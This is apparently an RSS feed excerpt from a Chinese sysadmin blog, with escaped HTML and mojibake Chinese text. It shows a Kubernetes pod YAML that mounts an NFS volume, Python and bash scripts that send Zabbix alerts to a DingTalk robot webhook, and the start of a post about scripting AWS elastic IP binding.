&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-yaml&#34; data-lang=&#34;yaml&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nt&#34;&gt;apiVersion&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;v1&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;kind&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;Pod&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;metadata&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;labels&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;app.kubernetes.io/name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;alpine&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;spec&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;containers&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;- &lt;span class=&#34;nt&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;alpine&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;image&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;alpine:latest&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;command&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;touch&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;/data/test&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;volumeMounts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;- &lt;span class=&#34;nt&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;nfs-volume&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;          &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;mountPath&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;/data&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;volumes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;- &lt;span class=&#34;nt&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;nfs-volume&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;nfs&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;server&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;m&#34;&gt;10.10.247.38&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;/data&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;readOnly&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;no&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¿™ä¸ªpodæ˜¯ä¸€æ¬¡æ€§è¿è¡Œçš„ï¼Œè¿è¡Œå®Œåå°±å¯ä»¥çœ‹åˆ°nfsä¸­å¤šäº†ä¸ªtestæ–‡ä»¶&lt;/p&gt;</description>
    </item>
    <item>
      <title>é’‰é’‰å‘Šè­¦å‘é€</title>
      <link>https://rendoumi.com/posts/20221123-dingding/</link>
      <pubDate>Wed, 23 Nov 2022 11:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20221123-dingding/</guid>
      <description>&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;ch&#34;&gt;#!/usr/bin/env python&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#coding:utf-8&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#zabbixé’‰é’‰æŠ¥è­¦&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;requests&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;json&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;sys&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;os&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;datetime&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#è¿™é‡Œæ˜¯è‡ªå·±åˆ›å»ºçš„æœºå™¨äººçš„webhook&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;webhook&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;https://oapi.dingtalk.com/robot/send?access_token=xxxxxx&amp;#34;&lt;/span&gt;      
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sys&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sys&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;msgtype&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;text&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;text&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;content&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;text&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;},&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;at&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;atMobiles&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;user&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;isAtAll&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;False&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;headers&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Content-Type&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;application/json&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;requests&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;post&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;webhook&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;json&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dumps&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;headers&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;headers&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä¸‹é¢æ”¾shellè„šæœ¬çš„&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#!/bin/bash
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; ddmsg&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;Token&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;xxxxxxxxxxxx&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;Weburl&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;https://oapi.dingtalk.com/robot/send?access_token=&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    curl -ks -m &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;Weburl&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;Token&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;        -H &lt;span class=&#34;s1&#34;&gt;&amp;#39;Content-Type: application/json;charset=utf-8&amp;#39;&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;        -d &lt;span class=&#34;s2&#34;&gt;&amp;#34;{&amp;#39;msgtype&amp;#39;: &amp;#39;text&amp;#39;, 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;             &amp;#39;text&amp;#39;: { &amp;#39;content&amp;#39;: &amp;#39;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$*&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#39;}
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;        }&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&amp;gt;/tmp/ddmsg.log
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt; &lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;grep &lt;span class=&#34;s2&#34;&gt;&amp;#34;errmsg.*ok&amp;#34;&lt;/span&gt; /tmp/ddmsg.log &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;wc -l&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt; -ne &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;send error !&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;cat /tmp/ddmsg.log&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;exit&lt;/span&gt; 1&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#æµ‹è¯•å†…å®¹&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;@è­¦æŠ¥
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;ä¸»æœº:&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;hostname&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;ä¿¡æ¯:Node test
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;æ—¶é—´:&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;date +&lt;span class=&#34;s2&#34;&gt;&amp;#34;%F %T&amp;#34;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&amp;gt;.msg
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat .msg
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ddmsg &lt;span class=&#34;s2&#34;&gt;&amp;#34;`cat .msg`&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>Freelancerä¹‹aws</title>
      <link>https://rendoumi.com/posts/20221123-freelancer_aws/</link>
      <pubDate>Wed, 23 Nov 2022 10:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20221123-freelancer_aws/</guid>
      <description>&lt;p&gt;å®¢æˆ·å‘äº†ä¸€ä¸ªéœ€æ±‚å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ç”¨shell æˆ–è€…python3 æ§åˆ¶awså»è·å–æ–°IPã€ç»‘å®šIPåˆ°å®ä¾‹
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¿™ä¸ªå°±éå¸¸ç®€å•äº†ï¼Œå› ä¸ºæœ¬èº«awså°±æä¾›pythonçš„å·¥å…·ï¼Œä¸€åˆ‡éƒ½å¯ä»¥apiåŒ–çš„&lt;/p&gt;
&lt;p&gt;åšæ³•å¦‚ä¸‹ï¼š&lt;/p&gt;
